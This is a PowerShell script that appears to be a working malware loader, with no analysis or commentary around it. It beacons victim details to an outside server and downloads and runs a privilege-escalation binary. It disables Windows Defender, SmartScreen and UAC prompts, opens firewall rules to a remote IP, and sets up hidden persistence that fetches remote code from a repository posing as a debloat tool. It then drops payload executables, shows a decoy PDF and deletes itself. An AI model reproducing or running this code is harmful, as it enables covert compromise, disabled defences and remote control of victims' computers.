$ProgressPreference='SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}

$srv='https://signindat.com'
$gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main'
$sources=@($gh,$srv)

$logPath="$env:TEMP\wmisrv.log"
function _log($m){ "$((Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) | $m" | Out-File $logPath -Append -Encoding utf8 }

$cbHost=$env:COMPUTERNAME
$cbUser=$env:USERNAME
$cbPid=$pid
$cbIsAdmin=$false
try{$cbIp=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object{$_.InterfaceAlias -notmatch 'Loopback' -and $_.PrefixOrigin -ne 'WellKnown'}|Select-Object -First 1).IPAddress}catch{$cbIp='unknown'}
try{$cbOs=(Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption}catch{$cbOs='unknown'}

function _cb($stage,$status,$detail){
    try{
        $body=@{hostname=$cbHost;username=$cbUser;ip=$cbIp;os=$cbOs;is_admin=$cbIsAdmin;pid=$cbPid;stage=$stage;status=$status;detail=$detail;ts=(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')} | ConvertTo-Json -Compress
        $wc=New-Object Net.WebClient
        $wc.Headers.Add('Content-Type','application/json')
        $wc.UploadString("$srv/cb.php",'POST',$body)|Out-Null
    }catch{
        _log "CB: $stage err: $($_.Exception.Message)"
    }
}

_log "S0: pid=$pid, u=$env:USERNAME, h=$cbHost"
_cb 'S0' 'ok' "pid=$pid, u=$env:USERNAME, h=$cbHost"

try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
_log "S1: a=$cbIsAdmin"
_cb 'S1' 'ok' "is_admin=$cbIsAdmin"

function _dl($n){
    foreach($src in $sources){
        try{
            $wc=New-Object Net.WebClient
            $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            $d=$wc.DownloadData("$src/$n")
            _log "DL: $n $($d.Length)"
            return ,$d
        }catch{
            _log "DL: $n fail from $src"
        }
    }
    _log "DL: $n fail all sources"
    return $null
}

function _run($n,$s,$l){
    $b=_dl $n
    if(-not $b){_cb $s 'fail' "$l dl";return $false}
    $p="$env:TEMP\$n"
    try{
        [IO.File]::WriteAllBytes($p,$b)|Out-Null
        Start-Process $p -WindowStyle Hidden | Out-Null
        _log "$s : $l ok"
        _cb $s 'ok' "$l ok"
        return $true
    }catch{
        _cb $s 'fail' "$l err"
        return $false
    }
}

function _runWait($n,$a,$s,$l,$sec){
    $b=_dl $n
    if(-not $b){_cb $s 'fail' "$l dl";return $false}
    $p="$env:TEMP\$n"
    try{
        [IO.File]::WriteAllBytes($p,$b)|Out-Null
        $proc=Start-Process $p -ArgumentList $a -NoNewWindow -PassThru
        _log "$s : $l started pid=$($proc.Id), waiting ${sec}s"
        Start-Sleep $sec
        if(-not $proc.HasExited){try{$proc.Kill()|Out-Null}catch{}}
        _log "$s : $l exit=$($proc.ExitCode)"
        _cb $s 'ok' "$l ok"
        return $true
    }catch{
        _cb $s 'fail' "$l err"
        return $false
    }
}

function _regSet($path,$name,$value,$type='DWord'){
    try{
        if(-not(Test-Path $path)){New-Item -Path $path -Force|Out-Null}
        Set-ItemProperty -Path $path -Name $name -Value $value -Type $type -Force -ErrorAction SilentlyContinue | Out-Null
    }catch{}
}

# S1: ELEVATION via CMSTPLUA
if(-not $cbIsAdmin){
    _run 'ElevatorShellCode.exe' 'S1' 'elev' | Out-Null
    Start-Sleep 15
    try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
    _log "S1: a=$cbIsAdmin"
    if($cbIsAdmin){_cb 'S1' 'ok' 'elevation ok'}else{_cb 'S1' 'warn' 'elevation fail, continuing as user'}
}

# S1b: FIREWALL OPEN (admin only)
if($cbIsAdmin){
    $fwIP='193.26.115.196'
    $fwPorts=@(80,443,5173,4782)
    $fwProcs=@("$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe","$env:TEMP\wmdrs.exe","$env:APPDATA\Microsoft\wmdrs.exe","$env:LOCALAPPDATA\Microsoft\wmdrs.exe")
    foreach($p in $fwPorts){
        netsh advfirewall firewall add rule name="WinHealth TCP $p Out" dir=out action=allow protocol=TCP remoteip=$fwIP remoteport=$p 2>&1 | Out-Null
        netsh advfirewall firewall add rule name="WinHealth TCP $p In" dir=in action=allow protocol=TCP localport=$p 2>&1 | Out-Null
    }
    foreach($x in $fwProcs){
        if(Test-Path $x){netsh advfirewall firewall add rule name="WinHealth $(Split-Path $x -Leaf)" dir=out action=allow program="$x" enable=yes 2>&1 | Out-Null}
    }
    _log "S1b: firewall rules added for $fwIP : $($fwPorts -join ',')"
    _cb 'S1b' 'ok' "fw open $fwIP : $($fwPorts -join ',')"
}

# S2: SOPHIA-BASED DEFENSE TAKEDOWN (admin only)
if($cbIsAdmin){
    try{
        Set-MpPreference -DisableTamperProtection $true -ErrorAction Stop
        _log "S2: tamper off (cmdlet)"
    }catch{
        _regSet 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' 'TamperProtection' 0
        _log "S2: tamper off (reg fallback)"
    }

    _regSet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'ConsentPromptBehaviorAdmin' 0
    _regSet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'ConsentPromptBehaviorUser' 3
    _regSet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'EnableLUA' 1
    _regSet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'PromptOnSecureDesktop' 1
    _log "S2: AdminApprovalMode -Never applied"

    try{_regSet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' 'SmartScreenEnabled' 'Off' 'String'}catch{}
    _log "S2: AppsSmartScreen disabled"

    _regSet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' 'SaveZoneInformation' 1
    _regSet 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments' 'SaveZoneInformation' 1
    _log "S2: SaveZoneInformation disabled"

    $exclPaths=@("$env:TEMP","$env:APPDATA\Microsoft","$env:LOCALAPPDATA\Microsoft","$env:USERPROFILE\Downloads")
    foreach($ep in $exclPaths){
        try{New-Item -Path $ep -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null; Add-MpPreference -ExclusionPath $ep -ErrorAction SilentlyContinue | Out-Null}catch{}
    }
    $exclProcs=@('wmdrs.exe','wmisrv.exe','svchost.exe','msupdate.exe','powershell.exe','windefctl.exe','cmd.exe','wscript.exe','cscript.exe')
    foreach($xp in $exclProcs){try{Add-MpPreference -ExclusionProcess $xp -ErrorAction SilentlyContinue | Out-Null}catch{}}

    try{
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableOnAccessProtection $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableAntiSpyware $true -ErrorAction SilentlyContinue
        Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
        Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
        Set-MpPreference -EnableNetworkProtection Disabled -ErrorAction SilentlyContinue
        _log "S2: all cmdlets + Sophia NetworkProtection disabled"
    }catch{
        _log "S2: cmdlets fail: $_"
    }

    try{
        _regSet 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Configuration Manager' 'EnablePeriodicBackup' 0
        _regSet 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\MpEngine' 'MpEnablePus' 0
    }catch{}

    try{& "$env:SystemRoot\System32\setx.exe" /M MP_FORCE_USE_SANDBOX 0}catch{}
    _log "S2: DefenderSandbox disabled"

    $dp='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
    _regSet $dp 'DisableAntiSpyware' 1
    _regSet $dp 'DisableRoutinelyTakingAction' 1
    $rtp="$dp\Real-Time Protection"
    _regSet $rtp 'DisableRealtimeMonitoring' 1
    _regSet $rtp 'DisableBehaviorMonitoring' 1
    _regSet $rtp 'DisableOnAccessProtection' 1
    _regSet $rtp 'DisableScanOnRealtimeEnable' 1
    _log "S2: reg hard-disable ok"
    _cb 'S2' 'ok' 'defender+sophia takedown'

    try{
        Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
        Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
        Stop-Service -Name 'SecurityHealthService' -Force -ErrorAction SilentlyContinue
        Stop-Service -Name 'wscsvc' -Force -ErrorAction SilentlyContinue
        _log "S2: services stopped"
    }catch{_log "S2: service fail: $_"}
}

# S2b: BINARY DEFENDER KILL
_log "S2b: windefctl exec (admin=$cbIsAdmin)"
_runWait 'windefctl.exe' 'kill' 'S2b' 'defkill' 18 | Out-Null
_cb 'S2b' 'ok' 'defkill done'
Remove-Item "$env:TEMP\windefctl.exe" -Force -ErrorAction SilentlyContinue | Out-Null

# S3: PERSISTENCE
$persistCmd='powershell -w hidden -NoP -c "$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes($env:TEMP\u.ps1,$w.DownloadData(''https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/updatemspulsv2.ps1''));powershell -w hidden -NoP -file $env:TEMP\u.ps1"'
try{
    $rk='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    Set-ItemProperty -Path $rk -Name 'WindowsSecurityHealth' -Value $persistCmd -Force -ErrorAction SilentlyContinue | Out-Null
}catch{}

if($cbIsAdmin){
    try{
        $rk='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
        Set-ItemProperty -Path $rk -Name 'WindowsUpdateOrchestrator' -Value $persistCmd -Force -ErrorAction SilentlyContinue | Out-Null
    }catch{}

    $taskName='WindowsHealthMonitor'
    schtasks /delete /tn $taskName /f 2>$null | Out-Null
    $xml=@"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
<RegistrationInfo><Author>Microsoft Corporation</Author><Description>Windows Health Monitor Service</Description></RegistrationInfo>
<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger><BootTrigger><Enabled>true</Enabled></BootTrigger><CalendarTrigger><StartBoundary>2024-01-01T00:00:00</StartBoundary><Repetition><Interval>PT2H</Interval></Repetition><Enabled>true</Enabled></CalendarTrigger></Triggers>
<Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings>
<Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-w hidden -NoP -c "`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(\"`$env:TEMP\\u.ps1\",`$w.DownloadData('$gh/updatemspulsv2.ps1'));powershell -w hidden -NoP -file `$env:TEMP\\u.ps1"</Arguments></Exec></Actions>
</Task>
"@
    $xmlPath="$env:TEMP\task.xml"
    [IO.File]::WriteAllText($xmlPath,$xml,[Text.Encoding]::Unicode)
    schtasks /create /tn $taskName /xml $xmlPath /f 2>&1 | Out-Null
    Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
}

_cb 'S3' 'ok' 'persist ok'

# S5: PAYLOAD
$payloadPath="$env:APPDATA\Microsoft\wmdrs.exe"
$payloadExists=(Test-Path $payloadPath)
_log "S5: exists=$payloadExists at $payloadPath"

if(-not $payloadExists){
    $fallbackPath="$env:LOCALAPPDATA\Microsoft\wmdrs.exe"
    if(Test-Path $fallbackPath){$payloadPath=$fallbackPath; $payloadExists=$true; _log "S5: fallback found at $fallbackPath"}
}

if($payloadExists){
    try{
        $p=Start-Process $payloadPath -WindowStyle Hidden -PassThru
        _log "S5: re-launch PID=$($p.Id) from $payloadPath"
        _cb 'S5' 'ok' "re-launch PID=$($p.Id)"
    }catch{
        _log "S5: re-launch fail: $_, will re-download"
        $payloadExists=$false
    }
}

if(-not $payloadExists){
    _log "S5: downloading wdsr681f3e18"
    $payloadBytes=_dl 'PatchPulsaar.exe'
    if($payloadBytes){
        $primaryPath="$env:TEMP\wmdrs.exe"
        [IO.File]::WriteAllBytes($primaryPath,$payloadBytes)|Out-Null
        $copyTargets=@("$env:APPDATA\Microsoft\wmdrs.exe","$env:LOCALAPPDATA\Microsoft\wmdrs.exe")
        foreach($ct in $copyTargets){
            try{
                $dir=Split-Path $ct -Parent
                if(-not(Test-Path $dir)){New-Item -Path $dir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null}
                Copy-Item $primaryPath $ct -Force
                _log "S5: copied to $ct"
            }catch{_log "S5: copy fail $ct : $_"}
        }
        try{
            $launchPath="$env:APPDATA\Microsoft\wmdrs.exe"
            $p=Start-Process $launchPath -WindowStyle Hidden -PassThru
            _log "S5: payload PID=$($p.Id) from AppData"
            _cb 'S5' 'ok' "PID=$($p.Id)"
        }catch{
            _log "S5: launch fail: $_"
            _cb 'S5' 'fail' "launch err"
        }
        Remove-Item "$env:TEMP\wmdrs.exe" -Force -ErrorAction SilentlyContinue | Out-Null
    }else{
        _log "S5: payload dl fail"
        _cb 'S5' 'fail' 'dl fail'
    }
}

# S5b: PATCHPULSAAR
$ppPath="$env:APPDATA\Microsoft\pp.exe"
$ppExists=(Test-Path $ppPath)
_log "S5b: exists=$ppExists at $ppPath"

if(-not $ppExists){
    $ppFallback="$env:LOCALAPPDATA\Microsoft\pp.exe"
    if(Test-Path $ppFallback){$ppPath=$ppFallback; $ppExists=$true; _log "S5b: fallback found at $ppPath"}
}

if($ppExists){
    try{
        $pp=Start-Process $ppPath -WindowStyle Hidden -PassThru
        _log "S5b: re-launch PID=$($pp.Id) from $ppPath"
        _cb 'S5b' 'ok' "re-launch PID=$($pp.Id)"
    }catch{
        _log "S5b: re-launch fail: $_, will re-download"
        $ppExists=$false
    }
}

if(-not $ppExists){
    _log "S5b: downloading PatchPulsaar"
    $ppBytes=_dl 'PatchPulsaar.exe'
    if($ppBytes){
        $ppTmp="$env:TEMP\pp.exe"
        [IO.File]::WriteAllBytes($ppTmp,$ppBytes)|Out-Null
        $ppCopyTargets=@("$env:APPDATA\Microsoft\pp.exe","$env:LOCALAPPDATA\Microsoft\pp.exe")
        foreach($ct in $ppCopyTargets){
            try{
                $dir=Split-Path $ct -Parent
                if(-not(Test-Path $dir)){New-Item -Path $dir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null}
                Copy-Item $ppTmp $ct -Force
                _log "S5b: copied to $ct"
            }catch{_log "S5b: copy fail $ct : $_"}
        }
        try{
            $ppLaunch="$env:APPDATA\Microsoft\pp.exe"
            $pp=Start-Process $ppLaunch -WindowStyle Hidden -PassThru
            _log "S5b: PatchPulsaar PID=$($pp.Id) from AppData"
            _cb 'S5b' 'ok' "PID=$($pp.Id)"
        }catch{
            _log "S5b: launch fail: $_"
            _cb 'S5b' 'fail' "launch err"
        }
        Remove-Item "$env:TEMP\pp.exe" -Force -ErrorAction SilentlyContinue | Out-Null
    }else{
        _log "S5b: PatchPulsaar dl fail"
        _cb 'S5b' 'fail' 'dl fail'
    }
}

# S7: PDF DECOY
$markerPath="$env:APPDATA\Microsoft\wmdrs.seen"
if(-not (Test-Path $markerPath)){
    $pdf='Rate_Confirmation_LD-2026-0847.pdf'
    $pdfPath="$env:USERPROFILE\Downloads\$pdf"
    $pdfBytes=_dl $pdf
    if($pdfBytes){
        [IO.File]::WriteAllBytes($pdfPath,$pdfBytes)|Out-Null
        try{
            Start-Process $pdfPath | Out-Null
            _cb 'S7' 'ok' 'pdf ok'
            Set-Content -Path $markerPath -Value ((Get-Date).ToString('o')) -NoNewline -Force
            _log "S7: pdf opened, marker set"
        }catch{_cb 'S7' 'warn' 'pdf open fail'}
    }else{_cb 'S7' 'warn' 'pdf dl fail'}
} else {
    _log "S7: skip (already shown)"
}

# S9: CLEANUP + SELF-DELETE
Start-Sleep 5
Remove-Item "$env:TEMP\u.ps1" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\windefctl.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\ElevatorShellCode.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\wdsr681f3e18.exe" -Force -ErrorAction SilentlyContinue
$sp=$MyInvocation.MyCommand.Path
if($sp -and (Test-Path $sp)){
    Start-Process powershell.exe -ArgumentList "-NoP -w hidden -c `"Start-Sleep 3;Remove-Item -Path '$sp' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden | Out-Null
}

_log 'S9: done'
_cb 'S9' 'ok' 'done'
